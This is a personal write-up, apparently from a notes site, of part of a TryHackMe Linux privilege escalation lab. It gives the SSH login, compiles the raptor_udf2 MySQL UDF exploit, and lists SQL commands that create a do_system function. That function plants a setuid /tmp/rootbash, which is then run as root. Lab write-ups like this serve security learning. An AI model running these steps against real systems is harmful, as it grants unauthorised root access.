---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-03T23:20:08.413+02:00","dg-note-properties":{}}
---

![](/img/user/Attachments/redteaming2.png)
## Description



## Initial Access

Following THM instructions and connecting to the target as per the command below. As suspeted OpenSSH have deprecated ssh-rsa so the extra argument is necessary. 

`ssh user@TARGET -oHostKeyAlgorithms=+ssh-rsa`

__________

## Service Exploits 

Entering the directory : `cd /home/user/tools/mysql-udf`

Compiling the **.c** file
`gcc -g -c raptor_udf2.c -fPIC`
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Connecting to mysql service as root with blank password

![](/img/user/Attachments/dbconnect.png)

Executing the commands as per the THM instructions

```
use mysql; 

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

## use the function to copy
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![](/img/user/Attachments/exploit_commands.png)

Now using the exploit to gain root privileges

`/tmp/rootbash -p`

![](/img/user/Attachments/firstroot.png)

Now deleting the exploit and exiting the shell

`rm /tmp/rootbash`

______

## Weak File Permissions - Readable /etc/shadow

